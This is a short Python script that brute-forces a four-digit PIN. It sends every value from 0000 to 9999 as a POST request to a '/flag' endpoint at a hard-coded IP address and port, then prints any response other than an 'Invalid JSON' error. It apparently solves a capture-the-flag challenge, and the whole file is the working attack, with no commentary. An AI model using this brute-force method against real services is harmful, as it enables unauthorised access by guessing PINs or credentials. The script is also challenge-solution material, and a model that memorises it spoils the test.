import requests

url = 'http://139.59.178.6:30862/flag'

for i in range(0, 10000):
	pin = {
	'pin' : f'%04d'% i
	}
	res = requests.post(url, data=pin);
	if '{"message":"Invalid JSON!"}' not in res.text:
		print(res.text)